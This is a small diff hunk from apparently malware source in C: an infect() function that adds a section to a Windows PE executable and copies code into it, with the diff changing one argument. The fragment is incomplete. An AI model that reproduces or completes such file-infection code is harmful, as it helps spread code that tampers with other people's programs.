@@ -54,7 +54,7 @@ int infect(const char* filename, data_t* data) {
   ntHeaders->OptionalHeader.SizeOfImage += align_value(data->codeSize, ntHeaders->OptionalHeader.SectionAlignment);
   //ntHeaders->OptionalHeader.SizeOfHeaders = ? //TODO handle
 
-  create_section_header(sectionHeader, ntHeaders, data);
+  create_section_header(sectionHeader, ntHeaders, data->codeSize);
 
   memcp(data->codeBegin, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);
 
